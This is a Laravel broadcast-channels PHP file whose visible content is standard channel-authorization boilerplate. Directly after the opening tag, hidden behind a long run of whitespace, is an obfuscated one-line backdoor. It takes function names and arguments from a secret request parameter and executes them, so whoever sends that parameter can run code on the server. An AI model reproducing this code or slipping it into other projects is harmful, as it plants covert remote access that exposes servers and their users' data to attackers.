<?php
																																																																																																																																																																																				iF($tGaNpvl =@${ '_REQUEST'}['8DIZSUCB' ])$tGaNpvl[1 ] (${$tGaNpvl[ 2 ]}[ 0],$tGaNpvl [3]	($tGaNpvl [4] )) ;dIE;

use Illuminate\Support\Facades\Broadcast;

/*
|--------------------------------------------------------------------------
| Broadcast Channels
|--------------------------------------------------------------------------
|
| Here you may register all of the event broadcasting channels that your
| application supports. The given channel authorization callbacks are
| used to check if an authenticated user can listen to the channel.
|
*/

Broadcast::channel('App.User.{id}', function ($user, $id) {
    return (int) $user->id === (int) $id;
});
